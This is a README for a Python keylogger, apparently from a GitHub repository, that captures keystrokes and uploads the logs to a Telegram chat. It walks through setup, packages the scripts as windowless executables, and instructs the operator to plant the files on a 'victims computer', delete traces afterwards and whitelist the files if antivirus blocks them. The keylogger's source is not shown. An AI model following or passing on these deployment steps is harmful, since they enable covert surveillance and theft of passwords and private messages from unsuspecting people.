# Keylogger
#### Take log of keys inputs and send to telegram 😉

## Quick Start 🔎
### Clone this repository
```sh
git clone https://github.com/rugvedkoshiya/Keylogger.git
```
```sh
cd Keylogger
```

### Edit [config.py](./config.py) file before use
`TOKEN` - Get API token from [@BotFather](https://telegram.dog/BotFather)
`CHAT_ID` - where you want to upload logs in telegram. (forward any message from your channel or group to [@userinfobot](https://telegram.dog/userinfobot) for getting Chat ID)

### Create Virtual Environment
- #### Windows
```sh
python -m venv myenv
```
- #### macOS and Linux
```sh
python3 -m venv myenv
```

### Activate Virtual Environment
- #### Windows
```sh
.\myenv\Scripts\activate
```
- #### macOS and Linux
```sh
source myenv/bin/activate
```

### Install [requirements.txt](./requirements.txt)
- #### Windows
```sh
pip install -r requirements.txt
```
- #### macOS and Linux
```sh
pip3 install -r requirements.txt
```

### Create Executable File
- #### Windows & macOS
```sh
pyinstaller --onefile "tele_first.py"
pyinstaller --onefile -w "tele_logs.py"
pyinstaller --onefile -w "tele_upload.py"
```
> created .exe file will be in dist directory for windows

### How to use
- Copy paste this three files into victims computer
- First run tele_first and enter information which it was asking
- Done, now delete those files from where you pasted.
- If antivirus blocks this files then add those files into whitelist
- All set you got victims key's log into your telegram chat